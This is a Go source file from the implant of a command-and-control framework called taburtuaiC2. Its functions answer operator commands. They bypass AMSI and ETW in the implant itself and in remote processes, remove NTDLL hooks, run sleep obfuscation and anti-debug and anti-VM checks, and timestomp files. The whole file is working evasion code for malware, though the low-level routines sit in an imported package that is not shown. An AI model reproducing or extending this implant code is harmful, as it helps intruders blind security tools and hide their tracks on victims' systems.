package main

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/mjopsec/taburtuaiC2/implant/evasion"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handleAMSIBypass(cmd *types.Command, result *types.CommandResult) {
	if cmd.BypassTargetPID > 0 {
		// Remote process: use byte-patch (HWBP cannot be injected into a remote thread trivially)
		if err := evasion.PatchAMSIRemote(cmd.BypassTargetPID); err != nil {
			result.Error = err.Error()
			result.ExitCode = 1
			return
		}
		result.Output = fmt.Sprintf("[+] AMSI patched in PID %d", cmd.BypassTargetPID)
		return
	}
	// Self-process: patchless HWBP bypass — no byte modifications to amsi.dll
	if err := evasion.BypassAMSIHWBP(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] Patchless AMSI bypass active (HWBP on AmsiScanBuffer)"
}

func handleETWBypass(cmd *types.Command, result *types.CommandResult) {
	if cmd.BypassTargetPID > 0 {
		// Remote process: use byte-patch
		if err := evasion.PatchETWRemote(cmd.BypassTargetPID); err != nil {
			result.Error = err.Error()
			result.ExitCode = 1
			return
		}
		result.Output = fmt.Sprintf("[+] ETW patched in PID %d", cmd.BypassTargetPID)
		return
	}
	// Self-process: patchless HWBP bypass — no byte modifications to ntdll
	if err := evasion.BypassETWHWBP(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] Patchless ETW bypass active (HWBP on EtwEventWrite)"
}

func handleAMSIHWBP(result *types.CommandResult) {
	if err := evasion.BypassAMSIHWBP(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] Patchless AMSI bypass active (HWBP on AmsiScanBuffer)"
}

func handleETWHWBP(result *types.CommandResult) {
	if err := evasion.BypassETWHWBP(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] Patchless ETW bypass active (HWBP on EtwEventWrite)"
}

func handleHWBPSet(cmd *types.Command, result *types.CommandResult) {
	if cmd.HWBPAddr == "" {
		result.Error = "hwbp_addr required (hex string, e.g. 0x7FFE1234)"
		result.ExitCode = 1
		return
	}
	addr, err := strconv.ParseUint(strings.TrimPrefix(cmd.HWBPAddr, "0x"), 16, 64)
	if err != nil {
		result.Error = fmt.Sprintf("invalid hwbp_addr: %v", err)
		result.ExitCode = 1
		return
	}
	slot := evasion.HWBPSlot(cmd.HWBPRegister)
	if err := evasion.SetHWBP(slot, uintptr(addr), func(a uintptr) {
		dbgf("[HWBP] DR%d hit at 0x%X\n", slot, a)
	}); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] HWBP set at 0x%X on DR%d", addr, slot)
}

func handleHWBPClear(cmd *types.Command, result *types.CommandResult) {
	slot := evasion.HWBPSlot(cmd.HWBPRegister)
	if err := evasion.ClearHWBP(slot); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] HWBP cleared on DR%d", slot)
}

func handleUnhookNTDLL(_ *types.Command, result *types.CommandResult) {
	if err := evasion.UnhookNTDLL(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] NTDLL .text section restored from disk copy — hooks removed"
}

func handleSleepObf(cmd *types.Command, result *types.CommandResult) {
	d := time.Duration(cmd.SleepDuration) * time.Second
	if d <= 0 {
		d = 30 * time.Second
	}
	sleepObf(d)
	result.Output = fmt.Sprintf("[+] Slept %s with memory obfuscation", d)
}

func handleAntiDebug(_ *types.Command, result *types.CommandResult) {
	report := evasion.AntiDebugReport()
	result.Output = "[antidebug] " + report
	if evasion.IsDebugged() {
		result.ExitCode = 1
	}
}

func handleAntiVM(_ *types.Command, result *types.CommandResult) {
	report := evasion.AntiVMReport()
	result.Output = "[antivm] " + report
	if evasion.IsVM() {
		result.ExitCode = 1
	}
}

func handleTimestomp(cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "timestomp requires source_path (target file)"
		result.ExitCode = 1
		return
	}
	var setTime *time.Time
	if cmd.TimestompTime != "" {
		t, err := time.Parse(time.RFC3339, cmd.TimestompTime)
		if err != nil {
			result.Error = fmt.Sprintf("invalid timestomp_time (use RFC3339): %v", err)
			result.ExitCode = 1
			return
		}
		setTime = &t
	}
	if err := evasion.TimestompFile(cmd.SourcePath, cmd.TimestompRef, setTime); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	ref := cmd.TimestompRef
	if ref == "" && setTime == nil {
		ref = `C:\Windows\System32\kernel32.dll`
	}
	if ref != "" {
		result.Output = fmt.Sprintf("[+] Timestomped %s ← %s", cmd.SourcePath, ref)
	} else {
		result.Output = fmt.Sprintf("[+] Timestomped %s ← %s", cmd.SourcePath, cmd.TimestompTime)
	}
}
